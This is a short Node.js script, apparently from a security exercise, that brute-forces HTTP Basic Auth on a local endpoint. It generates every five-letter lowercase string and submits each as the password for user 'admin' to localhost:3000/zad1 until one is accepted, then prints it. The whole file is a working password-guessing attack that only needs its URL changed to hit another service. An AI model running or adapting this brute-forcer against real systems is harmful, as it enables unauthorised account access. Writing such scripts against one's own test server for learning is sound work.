const axios = require("axios");

function generateCombinations(n) {
  const result = [];
  const characters = "abcdefghijklmnopqrstuvwxyz";
  const combinations = (prefix, chars, length) => {
    if (length === 0) {
      result.push(prefix);
      return;
    }
    for (let i = 0; i < chars.length; i++) {
      combinations(prefix + chars[i], chars, length - 1);
    }
  };
  combinations("", characters, n);
  return result;
}

const combinations = generateCombinations(5);
console.log(combinations);

async function tryPasswords() {
  for (let i = 0; i < combinations.length; i++) {
    try {
      const response = await axios({
        method: "get",
        url: "http://localhost:3000/zad1",
        auth: {
          username: "admin",
          password: combinations[i],
        },
      });
      console.log("Password found: " + combinations[i]);
      return;
    } catch (error) {
      //   console.error(error);
    }
  }
}

tryPasswords();
